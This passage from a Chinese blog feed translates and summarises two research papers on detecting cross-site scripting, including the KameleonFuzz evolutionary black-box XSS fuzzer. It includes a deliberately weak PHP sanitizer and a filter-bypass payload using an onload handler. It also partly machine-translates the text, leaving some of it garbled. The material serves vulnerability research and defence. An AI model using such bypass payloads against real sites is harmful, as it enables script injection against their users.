alt="此处输入图片的描述"></p><p>在文件名用作片段启动器之后立即签名（＃），除此之外的任何内容都不是查询的一部分。大多数众所周知的浏览器都不会将片段发送到服务器。<br>因此，代码的实际恶意部分不会出现在服务器上，因此，服务器会看到相当于<a href="http://www.vulnerable.site/welcome.html%E3%80%82%E5%9F%BA%E4%BA%8EDOM%E7%9A%84XSS%E7%9A%84%E6%9B%B4%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%9C%A8Amit">http://www.vulnerable.site/welcome.html。基于DOM的XSS的更多场景在Amit</a> Klein的文章中。他建议最大限度地减少代码中不安全的JavaScript实践可能会降低基于DOM的XSS的可能性。 Web开发人员在依赖本地变量进行数据和控制时必须非常小心，并且应该关注使用用户输入修改DOM的场景。</p><p>自动化测试在识别和验证基于DOM的XSS方面的成功非常有限，因为它通常通过发送特定的有效负载来识别XSS并尝试在服务器响应中观察它。如果我们排除（＃）符号的想法但在下面的设计案例中可能不起作用，这对于图9可能正常工作：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC13.png" alt="此处输入图片的描述"></p><p>因此，自动化测试不会检测可能对基于DOM的XSS敏感的区域，除非测试工具可以执行客户端代码的附加分析<br>因此，应该进行手动测试，并且可以通过检查代码中可能对攻击者有用的参数区域来完成。此类区域的示例包括将代码动态写入页面的位置以及修改DOM的其他位置或甚至直接执行脚本的位置。</p><h3 id="多模块问题的问题"><a href="#多模块问题的问题" class="headerlink" title="多模块问题的问题"></a><strong>多模块问题的问题</strong></h3><p>服务器页面的漏洞是Web应用程序漏洞的必要条件，但它不是必要条件（不理解）。这意味着保护任何单个页面免受恶意代码的侵害，从不保证整个Web应用程序的保护。服务器页面可以将用户数据发送到其他页面或任何其他持久数据存储而不是客户端浏览器。在这些情况下，XSS可能通过另一个页面发生。大多数现有系统不提供任何程序来处理这种困难。**在多模块场景中，可以使用一些会话变量将数据从一个模块传递到另一个模块，并将这些会话变量状态存储在cookie中。**让我们看看下面的例子。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC14.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC15.png" alt="此处输入图片的描述"></p><p>在图13中，我们可以看到用户输入存储在会话变量中，之后它被存储到<code>$name</code>变量中。在图14中，该会话变量通过不同的页面回显。因此，<code>$name</code>变量的任何过滤过程都不会影响会话变量。在这种情况下，任何恶意代码都可以使用会话变量创建XSS向量，并可以绕过任何过滤进程。 </p><p>在阅读了一个开源Web应用程序LogiCampus Educational Platform的源代码文件后，我找到了几个漏洞。表II中给出了不同种类漏洞的数量**。为了找到基于DOM的XSS漏洞，需要查看用于在客户端网页上编写的DOM修改代码或代码。**</p><p><strong>跟踪任何动态使用用户定义数据的模式，例如任何事件处理程序或内联脚本代码，以分析静态脚本代码问题</strong>。<strong>多模块问题主要由会话变量引起。因此，我使用会话变量跟踪数据流</strong>，并且此应用程序使用了几个会话变量，但在向客户端站点显示任何用户定义数据之前，此应用程序使用过滤功能。因此，这些会话变量都不会为此应用程序创建任何多模块问题。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A3%80%E6%B5%8B%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC16.png" alt="此处输入图片的描述"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h2><p>这是我对大多数著名的注入问题，跨站脚本的分析报告。我没有实现或运行任何工具来进行实验。我使用他们的算法和程序来理解它们是如何工作的，并总结了它们的成功和局限性。我没有发现任何100％完美的方法。即使我没有提供任何可以检测XSS的工具。</p><p>我为未来的运动保留了这项任务。 </p><p>Web应用程序执行许多关键任务并处理敏感信息。在我们的日常生活中，我们通过这种媒体传递了许多机密数据。所以这个平台必须安全稳定。如今，针对这些注入问题和XSS面临安全问题的Web应用程序就是其中之一。</p><p>研究人员正在努力使我们的Web应用程序平台更可靠。该调查报告将帮助他们进一步研究这一问题。我相信本报告提供了用于检测XSS的所有方法的摘要，以及它们的局限性和成功性</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a><strong>个人总结</strong></h2><p>这篇文章主要讲解了当前检测 XSS 漏洞的主要技术：主要分为静态方法和动态方法，还有动静结合</p><p><strong>动态方法分为：</strong></p><p>(1)基于漏洞分析的方法：1.改造接收器识别危险字符 2.分析句法结构<br>(2)攻击预防方法：1.代理策略 2.浏览器策略</p><p><strong>静态方法分为：</strong></p><p>(1)污点传播分析：从源到接收器的全部路径进行过滤<br>(2)字符串分析：有限状态自动机进行分析<br>(3)脚本黑名单防止XSS：设置标签黑名单<br>(4)软件测试技术：黑盒测试<br>(4)有界模型检验：对变量的威胁级别进行打分，最后算整个的均分和阙值比较</p><p>还讲到了 XSS 检测可能会遇到的一些问题</p><p>(1)不安全的 JS 使用方式，如使用危险函数配合用户输入等<br>(2)浏览器实现方式的多样性<br>(3)dom xss 难以检测的问题</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="https://www.researchgate.net/publication/45869540_Consideration_Points_Detecting_Cross-Site_Scripting">Consideration Points Detecting Cross-Site Scripting</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KameleonFuzz：黑盒XSS检测的进化模糊测试(半机翻有删增)</title>
    <link href="/2019/02/26/KameleonFuzz%EF%BC%9A%E9%BB%91%E7%9B%92XSS%E6%A3%80%E6%B5%8B%E7%9A%84%E8%BF%9B%E5%8C%96%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
    <url>/2019/02/26/KameleonFuzz%EF%BC%9A%E9%BB%91%E7%9B%92XSS%E6%A3%80%E6%B5%8B%E7%9A%84%E8%BF%9B%E5%8C%96%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>模糊测试包括自动生成恶意输入并将其发送到应用程序，以便有可能触发漏洞。<strong>模糊测试需要这样的问题：在哪里模糊？模糊哪个参数？在哪里观察它的影响？等等</strong></p><p>在本文中，**我们特别针对以下问题：如何模糊参数？如何观察其影响？**为了解决这些问题，我们提出了KameleonFuzz，一个用于Web应用程序的blackbox Cross Site Scripting（XSS）fuzzer(模糊器)。</p><p>KameleonFuzz不仅可以生成利用XSS的恶意输入，还可以检测它揭示漏洞的接近程度。恶意输入的产生和演变是通过一种由攻击语法引导的遗传算法实现的**。双重污点推断**，直到浏览器解析树能够精确检测利用代码是否成功执行。我们的评估显示没有误报并且有着很好的 XSS 漏洞检测功能：KameleonFuzz检测到其他黑盒扫描仪遗漏下来的漏洞。</p><span id="more"></span><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><h3 id="现状"><a href="#现状" class="headerlink" title="现状"></a><strong>现状</strong></h3><p>在过去几年中，XSS臭名昭着地保持其在最大漏洞中的地位。犯罪分子使用XSS在Paypal，Facebook和eBay等网站上执行恶意活动，例如垃圾邮件，恶意软件运营商或用户模仿。由于此类网站的复杂性和代码大小，XSS的自动检测是一个非常重要的问题。在访问源代码的情况下，<strong>白盒技术的范围从静态分析到仪表化代码的动态监控</strong>。如果<strong>二进制或代码不可访问，则黑盒方法会生成输入并观察响应</strong>。此类方法独立于用于创建应用程序的语言，并避免了线束设置。由于它们模仿外部攻击者的行为，因此它们对于安全目的非常有用，并且可以测试诸如Web应用程序防火墙之类的防御。用于Web应用程序的自动黑盒安全测试工具早已存在。然而，即使在2012年，这类工具的故障检测能力也很低：最好的只能检测到40％的 存储型XSS，而1&#x2F;3 完全没有检测到。这是由学习知识不精确，近似判断和有限的攻击值集</p><p>Web漏洞的自动黑盒检测通常包括：第一个**“爬行”以推断应用程序的控制流**（以下称为宏状态感知），然后**“Fuzz”以生成可能表现出漏洞的恶意输入**。与不具有宏观状态意识的扫描仪相比，Doup等人。<strong>通过推断控制流模型来增加漏洞检测能力</strong>。在LigRE，Duch 等人<strong>使用污点流量推理扩展此类模型</strong>，并引导fuzzer 更进一步提高检测能力。 </p><p>XSS是一个涉及 控制+污点流和输入过滤的问题。即使是基本的过滤器，许多扫描仪也难以创造适当的输入，从而产生误报。为了解决上述问题，我们提出了KameleonFuzz，这是一种LigREextension，<strong>它通过对最有希望的恶意输入和污染流进行演化和优先排序来模仿人类攻击者</strong>。我们在KameleonFuzz中加入了一个精确的测试结果，它依赖于现有的浏览器解析和双重污染推理。</p><h3 id="我们的方法"><a href="#我们的方法" class="headerlink" title="我们的方法"></a><strong>我们的方法</strong></h3><p>KameleonFuzz是一款针对反射型和存储型 XSS的黑盒fuzzer，可以生成完整的开发序列。如下图所示，它包括学习应用程序模型和生成恶意输入。我们重用了其中的组件A，B，C。本文的主要贡献是块D1和D2。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer1.png" alt="此处输入图片的描述"></p><p>XSS涉及从HTTP请求Isrc上的模糊值xsrc到易受攻击的语句Odst（HTML页面）的污点流。在反射型 XSS中，xsrc直接在当前输出中出现，而在存储型 XSS中，xsrc存储在中间存储库中并在稍后反射。</p><h4 id="步骤A，控制流程推断学习如何在应用程序中导航。"><a href="#步骤A，控制流程推断学习如何在应用程序中导航。" class="headerlink" title="步骤A，控制流程推断学习如何在应用程序中导航。"></a><strong>步骤A，控制流程推断学习如何在应用程序中导航。</strong></h4><p>给定接口和连接参数（例如，认证凭证），以具有实例化参数值的扩展有限状态机的形式学习模型，以及两级层次结构（节点和宏状态）。推断的模型可能不完整。</p><h4 id="步骤B，近似污点流量推断检测到可能性"><a href="#步骤B，近似污点流量推断检测到可能性" class="headerlink" title="步骤B，近似污点流量推断检测到可能性"></a><strong>步骤B，近似污点流量推断检测到可能性</strong></h4><p>通过观察在请求Isrc中发送的值xsrc的反射到输出Odst（HTML页面）中的XSS。它在模型上生成步迹，并近似地推断出污点。<strong>子字符串匹配算法与启发式一起使用以避免漏报</strong>。下图显示了一个对照+污染流模型。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer2.png" alt="此处输入图片的描述"></p><ul><li>为清楚起见，我们仅表示转换上的输入，输出对应于彩色节点。</li><li>每种颜色对应一个宏观状态。输入由HTTP方法（例如，POST），URL的一部分（例如，&#x2F;？）和POST参数（例如，{‘message2’：’2_e_g_a_s_sem’}）组成，形式化控制+污点模型。</li></ul><h4 id="步骤C，通过应用一种称为斩波的特殊形式的切片来修剪对照-污染流模型。这减少了搜索空间。"><a href="#步骤C，通过应用一种称为斩波的特殊形式的切片来修剪对照-污染流模型。这减少了搜索空间。" class="headerlink" title="步骤C，通过应用一种称为斩波的特殊形式的切片来修剪对照+污染流模型。这减少了搜索空间。"></a><strong>步骤C，通过应用一种称为斩波的特殊形式的切片来修剪对照+污染流模型。这减少了搜索空间。</strong></h4><p>块D.1（恶意输入生成）和D.2（精确污染推论）是本文的重点</p><p>通过攻击语法参数化的遗传算法（GA）演变恶意输入。攻击语法通过约束生成下一代输入的变异和交叉运算符来减少搜索空间并模仿人类攻击者的行为。</p><p>我们定义了一种有利于XSS攻击的最合适输入的功能。<br>由于服务器过滤器可能会改变反射点Odst处的观察值，因此单纯的子串匹配可能无法准确地推断出污点，这可能导致漏报。 为了克服这些限制，我们进行双重污染推理。 我们在第3节中详细介绍了这些子组件。 </p><h3 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a><strong>贡献</strong></h3><p>本文的贡献是：</p><ul><li>第一个基于黑盒模型的GA驱动fuzzer，可检测反射型和存储型XSS; </li><li>模型推理和模糊测试的结合; </li><li>该方法的实施及其评估。</li></ul><h2 id="说明示例"><a href="#说明示例" class="headerlink" title="说明示例"></a><strong>说明示例</strong></h2><p>P0wnMe是一个易受攻击的应用程序。登录后，用户可以保存新笔记，查看已保存的笔记或注销。<br>P0wnMe上的KameleonFuzz执行在图1的步骤A和B中，LigREin一个控件+污点</p><p>一个简化的extract1的模型如图2所示。控制流由普通箭头（过渡）和节点表示。污点流源自在Isrc中发送的粗体文本xsrc，以及反射在Odst中的（虚线箭头）。例如，输入参数msg的值egassem_ 被发送到 7-&gt;17 的转化中 并在输出转化 18-&gt;21 中被反射</p><p>图2包含了一个在转换7中发送的参数message2的值2_e_g_a_s_sem_ 33.输出Odst的摘录是</p><pre><code class="hljs">&lt;input name =&quot;message2&quot; value =&#39;2_e_g_a_s_sem&#39;/&gt;</code></pre><p>其中我们突出显示反射。在这里，反射上下文位于标记属性值内。上下文中 了解攻击者如何生成fuzzer。清单1显示了此服务器的服务器清理程序信息。它阻止了简单的攻击</p><pre><code class="hljs">1 &lt;?php function webapp_filter($str) &#123;2 if(eregi(’&quot;|‘|&gt;|&lt;|;|/’,$str)) &#123;3 $filtered_str = &quot;XSS attempt!&quot;;4 &#125; else &#123;5 $filtered_str = str_replace(&quot; &quot;,&quot;&quot;,$str);6 &#125;7 return $filtered_str;8 &#125; ?&gt;</code></pre><p>攻击者搜索模糊值s.t. 如果通过过滤器，然后它的反射在语境中没有语法上的含义，即它跨越了解析树中的不同层次</p><p>表1显示了测试WebApp时由黑盒开源扫描程序w3af发送的模糊值。W3af迭代一组模糊值。它没有从以前的请求中学习，也没有考虑到反射的内容。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer3.png" alt="此处输入图片的描述"></p><p>在步骤D中，KameleonFuzz生成个体，即正常输入序列，其中它使反射值模糊。 斩波（LigRE的步骤C）产生输入序列。 攻击语法产生模糊值。 对于每个人，精确地推断出污点。 它是测试结果的输入（这个人是否触发了XSS？）和适当评分（这个人触发XSS的距离有多近？）。 最好的个体根据攻击语法相互重组以创建下一代：例如，第1代的个体3和4产生第2代中的个体1。该过程被迭代直到测试者定义停止条件满足（ 例如，找到一个XSS）。 表2说明了这种演变。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer4.png" alt="此处输入图片的描述"></p><p>最后一个人的输出Odst的摘录是</p><pre><code class="hljs">&lt;input name =&quot;message2&quot; value =&#39;WUkp&#39;nt onload =&#39;alert（94478）&#39;/&gt;</code></pre><p>由于清单1中的清理程序删除了空格，而不是\t，\r或\n，因此这是是一个成功的XSS漏洞，作为反射的语法连接违反了xsrc的行为。这个例子说明了进化输入生成如何适应过滤器。在下一节中，我们将详细介绍我们的模糊测量技术的进化特性。</p><h2 id="进化-Fuzz"><a href="#进化-Fuzz" class="headerlink" title="进化 Fuzz"></a><strong>进化 Fuzz</strong></h2><p>模糊测试（图1中的步骤D）生成一群个体（GA术语）。个体是由LigREin生成的输入序列，KameleonFuzz根据反射的攻击语法生成模糊值xsrc参数。如算法1中所述，该群体是通过突变和交叉算子 w.r.t进化而来的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer5.png" alt="此处输入图片的描述"></p><h3 id="差异"><a href="#差异" class="headerlink" title="差异"></a><strong>差异</strong></h3><p>个体是针对特定反射的输入序列。 它包含从切片模型中提取的非恶意输入序列，以及模糊值xsrc。<br>该序列包括始发过渡Isrc，以及观察反射Odst的过渡。</p><h3 id="攻击语法"><a href="#攻击语法" class="headerlink" title="攻击语法"></a><strong>攻击语法</strong></h3><p>为了约束搜索空间（的A* 子集，A是目标编码的字母表），我们使用攻击语法来生成模糊值。该语法还约束了变异和交叉算子（算法1的第3,14,16行）。攻击者会尝试向应用程序发送此类模糊值。与w3af和skipfish中的有效载荷列表相比，攻击语法可以生成更多值，并且由于其层次结构而更易于维护。</p><p><strong>用于构建攻击语法的知识</strong>包括HTML语法，在上下文改变的情况下的字符串转换，已知的攻击向量。</p><p>我们尝试了如何构建攻击语法，因为它是手动编写的，它的自动生成是一个研究方向。图3说明了它的结构。<br>第一个生产规则包括表示和上下文信息。在属性值（<code>&lt;input value =“reflection”/&gt;</code>）内部和标签外部（<code>&lt;h1&gt;</code>反射）是反射的示例行为背景。该表示由编码，字符集和特殊字符串转换函数组成，我们将其命名为anti-lter（例如，PHP addslashes)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer6.png" alt="此处输入图片的描述"></p><p>为了创建攻击语法，我们假设S的可用性，一组有代表性的易受攻击的Web应用程序（与测试的应用程序不同）和相应的XSS漏洞。对于每一个反射内容，分析师以终端和非终端的生产规则的形式写出了XSS漏洞的概括。<br>如果生产规则包括OR或REPEAT操作符，她根据S的利用频率分配选择权重。如果没有分配权重，则所有选择权重相等。一旦创建，我们使用此攻击语法对测试的应用程序进行模糊测试。</p><p>我们用扩展的Backus-Naur形式代表语法，重复次数有限。通过构造，攻击语法是非循环的。因此，它展现了很多可能性。附录C的清单3包含攻击语法的摘录。</p><p><strong>生成模糊值</strong>包括遍历其生产规则，并在适用的情况下执行选择。从模糊值生成相应的字符串包括连接通过深入探索上下文子树获得的字符串，在给定的字符集中表示此字符串，应用防过滤器函数，以及应用编码函数。例如，由图4的模糊值产生的字符串是WUkp’nt onload &#x3D;’alert（94478），在UTF-8字符集中，身份函数作为反字符应用，并且没有最终编码改变（节点平原）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer7.png" alt="此处输入图片的描述"></p><h3 id="精确污染流量推断（D-2）"><a href="#精确污染流量推断（D-2）" class="headerlink" title="精确污染流量推断（D.2）"></a><strong>精确污染流量推断（D.2）</strong></h3><p>精确的污点流量推断允许获得关于反射背景的信息，这稍后用于计算精确的测试判定，并且是适合函数的输入</p><p>用于产生污点感知的解析树Tdst如图5所示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer8.png" alt="此处输入图片的描述"></p><p>首先，在模糊值xsrc和反射它的输出Odst之间应用字符串到串的污点推理算法（例如，用Levenshtein编辑距离）。 并行地，解析器（例如，来自谷歌浏览器）评估应用程序输出Odst并产生解析树Pdst（例如，文档对象模型（DOM））。 然后在xsrc和Pdst的每个节点之间推断出污点以产生Tdst，一个污染感知的解析树（见图6），如下所示。</p><p>对于输出解析树Pdst的每个节点，我们计算每个受污染的子串与节点文本值之间的字符串距离。然后我们只保持最低的距离得分。</p><p>如果此分数低于测试人员定义的阈值，则此节点将标记为受污染。在邻居节点群具有接近阈值的距离\的情况下，这种污点条件可以略微放松。推断的污点感知解析树Tdst是用于适合函数和测试判定的输入。</p><p>重要的是要注意，我们依赖于真实的解析器，而不是编写我们自己的解析器。这有两个好处。首先，我们是<br>关于解析器是灵活的（例如，对于XSS：Chrome，Firefox，IE;对于其他漏洞，例如SQL注入，我们可以依赖于SQL解析器）。其次，我们确定检测到的漏洞的实际适用性。</p><h3 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a><strong>测试结论</strong></h3><p>测试判决回答了问题，这是否触发了XSS漏洞？。污点感知解析树Tdst（图6）与一组污点感知树模式匹配（例如，图7）。如果至少 一个模式匹配，然后是XSS漏洞利用（即，测试判定将输出yes，检测到漏洞）。 </p><p>污点树模式是在其节点上包含正则表达式的树。这些正则表达式可能包含字符串（例如，脚本），污点标记，重复运算符（+，*）或匹配所有字符（。）。 测试人员可以提供自己的模式。 </p><p>我们在KameleonFuzz中加入了XSS漏洞的默认模式。 这些都违反了污点价值的句法连接。图7中所示的第二个模式与图6中表示的解析树相匹配。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer9.png" alt="此处输入图片的描述"></p><h3 id="适应性"><a href="#适应性" class="headerlink" title="适应性"></a><strong>适应性</strong></h3><p>适应度函数评估单项发现XSS漏洞的“接近程度”。值越高，GA进化过程就更有可能选择这个个体的基因来创造下一代。 函数的输入是个体I，具体输出Odst，其中反映了在转换Isrc中发送的模糊值xsrc，Tdst &#x3D; taint（parse（Odst）; xsrc）taintaware解析树，以及应用模型M.在成功的XSS攻击的情况下，完整性维度与我们在模糊值和反射之间观察到的属性有关。这些尺寸列于表3中，我们绘制了当前使用的适应性函数的草图。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer10.png" alt="此处输入图片的描述"></p><p>这些维度模拟了人类渗透测试员可能具有的几种直觉。最重要的是：</p><h4 id="1-成功注入的特征类的百分比。"><a href="#1-成功注入的特征类的百分比。" class="headerlink" title="1.成功注入的特征类的百分比。"></a><strong>1.成功注入的特征类的百分比。</strong></h4><p>组成单个模糊值树的叶子的字符（参见图4）根据它们在语法中的含义被分类为类。该度量表示所考虑的反射的“注入功率”。</p><h4 id="2-解析树中受污染节点的数量。"><a href="#2-解析树中受污染节点的数量。" class="headerlink" title="2.解析树中受污染节点的数量。"></a><strong>2.解析树中受污染节点的数量。</strong></h4><p>尽管注入几个字符类很重要，但攻击者对多个解析树节点施加控制并不是一个充分条件。 成功的XSS注入通常以至少两个邻居被污染的节点为特征（一个被认为是连接反射，另一个包含有效载荷和一个有效载荷的触发器）。 因此，如果攻击者能够反映几个节点，我们预计它会增加利用潜在漏洞的机会。</p><h4 id="3-个人的奇点w-r-t-它的当代。-？？？"><a href="#3-个人的奇点w-r-t-它的当代。-？？？" class="headerlink" title="3.个人的奇点w.r.t.它的当代。 ？？？"></a><strong>3.个人的奇点w.r.t.它的当代。 ？？？</strong></h4><p>遗传算法的一个问题是过度专业化会限制探索的空间并不断发现相同的缺陷。 为了避免这个陷阱，我们计算一个人与当代人的“how singular”。该维度使用源转换Isrc，模糊值xsrc和反射上下文（即，目标转换Odst和解析树Tdst中的受污染节点）</p><h4 id="4-Isrc与其Reflection-Odst之间的转换次数"><a href="#4-Isrc与其Reflection-Odst之间的转换次数" class="headerlink" title="4.Isrc与其Reflection Odst之间的转换次数"></a><strong>4.Isrc与其Reflection Odst之间的转换次数</strong></h4><p>源转换Isrc与其Reflection Odst之间的转换次数越高，检测该漏洞的难度就越大，因为它会扩展搜索树。</p><h4 id="5-发现新页面或宏状态："><a href="#5-发现新页面或宏状态：" class="headerlink" title="5.发现新页面或宏状态："></a><strong>5.发现新页面或宏状态：</strong></h4><p>增加应用程序覆盖率。</p><h4 id="6-变异和交叉运算符"><a href="#6-变异和交叉运算符" class="headerlink" title="6.变异和交叉运算符"></a><strong>6.变异和交叉运算符</strong></h4><p>概率分布决定个体是否会发生变异。当发生突变时，可以在模糊值或输入序列上应用运算符。模糊值变异操作符在模糊值xsrc的生成树上工作（参见图4）。我们实现了几种策略来选择要变异的节点以及如何变异（例如，均匀分布，最近最少使用，……）。</p><p>突变的幅度是适应性得分的递减函数：如果个体具有高适应性得分，则突变将针对生产树中接近叶子的节点 类似地，在低适应性得分的情况下，操作员更可能改变靠近根的节点。应用于图4的模糊值变异的一个例子在于对HANDLER非终端执行不同的选择（例如，onmousover而不是onload）。输入序列变异算子在整个序列I上工作。它包括从源Isrcto到目标Odst的模型中的另一条路径，或者针对不同的反射交叉运算符在模糊值级别工作，即在生产树上工作。它的输入是两个高分数的人。它产生两个孩子。</p><h2 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h2><p>KameleonFuzz是一个针对反射型和存储型XSS的python3程序。它由4500行代码组成。如图8所示，我们使用Selenium库对Google Chrome 进行测试。我们使用LigRE，一个控件+污点流模型推理工具和切片器。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/blackbox%20xss%20fuzzer11.png" alt="此处输入图片的描述"></p><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a><strong>讨论</strong></h2><h3 id="方法限制"><a href="#方法限制" class="headerlink" title="方法限制"></a><strong>方法限制</strong></h3><h3 id="重置："><a href="#重置：" class="headerlink" title="重置："></a><strong>重置：</strong></h3><p>我们假设能够在初始状态下重置应用程序，这可能并不总是实用的（例如，在测试用户连接的实时应用程序时;我们会处理副本）或者可能需要时间。然而，这并没有打破黑盒线束的假设：我们不需要知道如何存储宏状态（例如，数据库）。</p><h3 id="生成攻击语法："><a href="#生成攻击语法：" class="headerlink" title="生成攻击语法："></a><strong>生成攻击语法：</strong></h3><p>生成攻击语法：编写攻击语法需要了解之前中提到的参数。 这项工作还是手动的。该语法生成的语言大小与故障检测能力之间的权衡还有待研究。 </p><p>过于狭窄的生成语言（例如，很少产生针对给定上下文的模糊值或非常少的上下文）可能限制故障检测能力，而过于重要的语言可能具有有限的效率。此外，攻击语法与目标注入子系列（例如，XSS，SQL注入等）相关联，因此对人类输入的需求是当前限制。 在自动化这一代过程中有研究的空间。</p><h3 id="XSS模型假设："><a href="#XSS模型假设：" class="headerlink" title="XSS模型假设："></a><strong>XSS模型假设：</strong></h3><p>我们假设XSS只是一个模糊值的结果。我们目前的方法可能在XSS上有误报，涉及一次至少两个模糊值的模糊测试。据我们所知，没有扫描仪可以处理这种情况。</p><h4 id="使用LigRE的限制："><a href="#使用LigRE的限制：" class="headerlink" title="使用LigRE的限制："></a><strong>使用LigRE的限制：</strong></h4><p>如果客户端不解释JavaScript时，KameleonFuzz支持Ajax应用程序，则它们具有相似的功能。 LigREreRequires在应用程序中识别非确定性值。</p><h4 id="编码："><a href="#编码：" class="headerlink" title="编码："></a><strong>编码：</strong></h4><p>污点的精确度和效率 推断取决于所考虑的编码转换。实现了Plain，url和base64编码。LigRE和KameleonFuzz可以扩展到支持更多。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><h3 id="黑盒方法中的XSS测试判定"><a href="#黑盒方法中的XSS测试判定" class="headerlink" title="黑盒方法中的XSS测试判定"></a><strong>黑盒方法中的XSS测试判定</strong></h3><h4 id="基于连接的方法"><a href="#基于连接的方法" class="headerlink" title="基于连接的方法:"></a><strong>基于连接的方法:</strong></h4><p>假设恶意输入在给定级别（词法或语法）中破坏结构。正如Sekar的工作，我们依赖于非语法连接，我们使用既有语法又有污点的检测策略。一个关键的区别是Sekar编写了自己的解析器来传播污点，而我们使用浏览器的解析器（例如Google Chrome）。因此我们两次推断污染（见图5）。通过这样做，我们确信已发现的XSS攻击的实际适用性，并且我们的实现是明智的w.r.t.浏览器。依赖于非词汇连接作为一种充分的故障检测措施，它更有效，但需要正确形成的输出（这在HTML网页上并不总是有效的假设）和很容易出现漏报。</p><h4 id="基于正则表达式的方法"><a href="#基于正则表达式的方法" class="headerlink" title="基于正则表达式的方法:"></a><strong>基于正则表达式的方法:</strong></h4><p>假设模糊值在应用程序输出中“as such ”反映，即，过滤器是身份功能。在过滤器的情况下，这可能导致误报。而且，大多数人不考虑反射背景，这可能导致误报。 IE8 和NoScript 依赖于模糊值的正则表达式。 XSSAuditor（Chrome XSS lter）与JavaScript DOM节点执行精确的字符串匹配。</p><h4 id="基于字符串距离的方法："><a href="#基于字符串距离的方法：" class="headerlink" title="基于字符串距离的方法："></a><strong>基于字符串距离的方法：</strong></h4><p>Sun 通过计算DOM节点与浏览器在运行时执行的请求之间的字符串距离来检测自我复制的XSS蠕虫。 IE8和Chrome XSSAuditor只能使用反射型XSS。 NoScript能够阻止某些存储型XSS，但只能作为Firefox插件使用。</p><h3 id="学习和安全测试"><a href="#学习和安全测试" class="headerlink" title="学习和安全测试"></a><strong>学习和安全测试</strong></h3><p>在其基本形式中，模糊测试是一种无向的黑盒主动测试技术。 主要针对内存损坏漏洞。 Stocketal。最近的工作模糊并检测白盒线束中的Type-0 XSS Heiderich等。检测由浏览器解析器怪癖引起的基于黑盒突变的XSS 。 LigRE + KameleonFuzz是一款黑盒式模糊游戏，针对反射和存储型XSS。</p><h4 id="用于黑盒安全测试的GA"><a href="#用于黑盒安全测试的GA" class="headerlink" title="用于黑盒安全测试的GA"></a><strong>用于黑盒安全测试的GA</strong></h4><p>已用于演变恶意软件和攻击者脚本。KameleonFuzz是GA对黑盒XSS搜索问题的第一个应用。它的适应性维度模拟了人类安全渗透测试人员的直觉。</p><h4 id="攻击语法："><a href="#攻击语法：" class="headerlink" title="攻击语法："></a><strong>攻击语法：</strong></h4><p>为XSS生成模糊值作为标记的组合在他们最近的工作中，Tripp等人。修剪基于测试历史的语法，以有效地确定反射的有效XSS攻击向量。将KameleonFuzz与他们的方法进行比较并将两者结合起来会很有趣。王等人。使用隐马尔可夫模型从XSS向量构建语法。</p><h4 id="安全测试的模型推断："><a href="#安全测试的模型推断：" class="headerlink" title="安全测试的模型推断："></a><strong>安全测试的模型推断：</strong></h4><p>Radamsa针对内存损坏漏洞：它从已知输入推断出语法，然后用模糊来创建新输入。舒等人从网络跟踪中被动推断模型，并主动模糊输入推断出触发失败的特定输入部分的可能性。对于命令注入漏洞（XSS，SQL注入，…），Dessiatniko等。根据SQL注入的特制距离进行集群页面。</p><p>Sotirov在XSS过滤器的逆向工程，局部模糊测试和远程模糊测试之间进行迭代。Doup等人。表明推断宏观状态感知控制流模型增加了漏洞检测能力。有了LigRE，Duchene等人。研究表明，增强这种具有污染流的模型可以进一步提高其能力。 KameleonFuzz扩展了LigRE，是一种黑盒完全主动的测试方法。它使用攻击语法和控制+污点流模型生成并演化获得的反射上的模糊输入。</p><h2 id="结论和未来的工作"><a href="#结论和未来的工作" class="headerlink" 